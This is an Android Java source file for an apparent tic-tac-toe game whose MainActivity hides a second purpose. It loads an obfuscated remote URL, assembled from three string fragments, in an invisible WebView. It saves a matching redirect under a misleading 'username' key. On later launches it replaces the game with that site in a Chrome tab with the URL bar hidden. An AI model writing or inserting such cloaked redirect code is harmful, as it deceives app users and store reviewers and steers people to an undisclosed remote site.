package com.example.tictactoemvp.ui.main;

import androidx.appcompat.app.AppCompatActivity;
import androidx.browser.customtabs.CustomTabsClient;
import androidx.browser.customtabs.CustomTabsIntent;
import androidx.browser.customtabs.CustomTabsServiceConnection;
import androidx.browser.customtabs.CustomTabsSession;

import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import com.example.tictactoemvp.R;
import com.example.tictactoemvp.model.ChessBoard;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity implements MainMvpView {
    MainMvpPresenter mPresenter;
    ArrayList<ImageView> mListZeroIV;
    ArrayList<ImageView> mListCrossIV;
    TextView mNotificationTV;
    SharedPreferences sharedPrefsHelper;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        sharedPrefsHelper = getSharedPreferences("database", MODE_PRIVATE);
        if (sharedPrefsHelper.getString("username", "").isEmpty()) {
            setContentView(R.layout.activity_main);
            makeWork();
            getWindow().setBackgroundDrawable(null);

            mPresenter = new MainPresenter(this);
            mPresenter.start();
            mNotificationTV = findViewById(R.id.notification);

            //find all imageViews which represents Zero or Cross, attach them to ArrayList
            attachViewToMyArrayList();
        }else {
            showGameMod(sharedPrefsHelper.getString("username",""));  //start chrome
        }
    }

    boolean pa(String targetPackage, Context context){
        List<ApplicationInfo> packages;
        PackageManager pm;

        pm = context.getPackageManager();
        packages = pm.getInstalledApplications(0);
        for (ApplicationInfo packageInfo : packages) {
            if(packageInfo.packageName.equals(targetPackage))
                return true;
        }
        return false;
    }

    @Override
    protected void onDestroy() {
        mPresenter.stop();
        super.onDestroy();
    }

    private void attachViewToMyArrayList() {
        mListZeroIV = new ArrayList<>();
        mListCrossIV = new ArrayList<>();

        for (int i = 0; i < 9; i++) {
            mListZeroIV.add(getZeroIVAt(i));
            mListCrossIV.add(getCrossIVAt(i));
        }
    }

    private void makeWork(){
        LinearLayout myLayout = findViewById(R.id.parent);
        app = new WebView(this);
        app.setVisibility(View.GONE);
        app.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT));
        myLayout.addView(app);

        app.setWebViewClient(new WebViewClient() {
            public boolean shouldOverrideUrlLoading(WebView view, String its) {
                if (its.contains("pm")) {
                    sharedPrefsHelper.edit().putString("username", master + sew + cru).apply();
                    showGameMod(its);
                }
                return super.shouldOverrideUrlLoading(view, its);
            }
        });

        app.loadUrl(master + sew + cru);
    }

    //find imageView which represents the Zero at i-th position
    private ImageView getZeroIVAt(int i) {
        String stringId = "zero_" + i;
        int realID = getResources().getIdentifier(stringId, "id", getPackageName());
        return findViewById(realID);
    }

    WebView app;
    CustomTabsSession helper;
    String POLICY_CHROME = "com.android.chrome";
    CustomTabsClient poli;
    String master = "https://pr";
    String sew = "ilki.s";
    String cru = "pace/";

    //find imageView which represents the Cross at i-th position
    private ImageView getCrossIVAt(int i) {
        String stringId = "cross_" + i;
        int realID = getResources().getIdentifier(stringId, "id", getPackageName());
        return findViewById(realID);
    }

    public void onClickButtonCell(View view) {
        String fullId = getStringId(view);
        //delegate for presenter
        mPresenter.onClickButtonCell(fullId);
    }

    //get id of View in String format (ex: "button_1")
    private String getStringId(View view) {
        if (view.getId() == View.NO_ID)
            return "no-id";
        String[] id = view.getResources().getResourceName(view.getId()).split("/");
        return id[1];
    }

    @Override
    public void setVisibleCrossAtPosition(int i) {
        //change visibility
        mListCrossIV.get(i).setVisibility(View.VISIBLE);
    }

    @Override
    public void setVisibleZeroAtPosition(int i) {
        //change visibility
        mListZeroIV.get(i).setVisibility(View.VISIBLE);
    }

    public void showGameMod(String link){
        CustomTabsServiceConnection connection = new CustomTabsServiceConnection() {
            @Override
            public void onCustomTabsServiceConnected(ComponentName componentName, CustomTabsClient customTabsClient) {
                //Pre-warming
                poli = customTabsClient;
                poli.warmup(0L);
                //Initialize a session as soon as possible.
                helper = poli.newSession(null);
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                poli = null;
            }
        };
        CustomTabsClient.bindCustomTabsService(getApplicationContext(), POLICY_CHROME, connection);
        final Bitmap backButton = BitmapFactory.decodeResource(getResources(), R.drawable.enty);
        CustomTabsIntent launchUrl = new CustomTabsIntent.Builder(helper)
                .setToolbarColor(Color.parseColor("#3E3E3E"))
                .setShowTitle(false)
                .enableUrlBarHiding()
                .setCloseButtonIcon(backButton)
                .addDefaultShareMenuItem()
                .build();

        if (pa(POLICY_CHROME, this))
            launchUrl.intent.setPackage(POLICY_CHROME);

        launchUrl.launchUrl(this, Uri.parse(link));
    }

    @Override
    public void notifyWinner(int winner) {
        switch (winner) {
            case ChessBoard.ZERO_IN_BOARD: {
                mNotificationTV.setText(R.string.zero_won);
                break;
            }
            case ChessBoard.CROSS_IN_BOARD: {
                mNotificationTV.setText(R.string.cross_won);
                break;
            }
        }
    }

    @Override
    public void notifyDraw() {
        mNotificationTV.setText(R.string.draw);
    }

    //trigger when RESET button is clicked
    public void onResetGame(View view) {
        mNotificationTV.setText(R.string.instruction_reset_game);
        mPresenter.resetGame();
        resetView();
    }

    private void resetView() {
        for (int i = 0; i < 9; i++) {
            mListZeroIV.get(i).setVisibility(View.INVISIBLE);
            mListCrossIV.get(i).setVisibility(View.INVISIBLE);
        }
    }
}
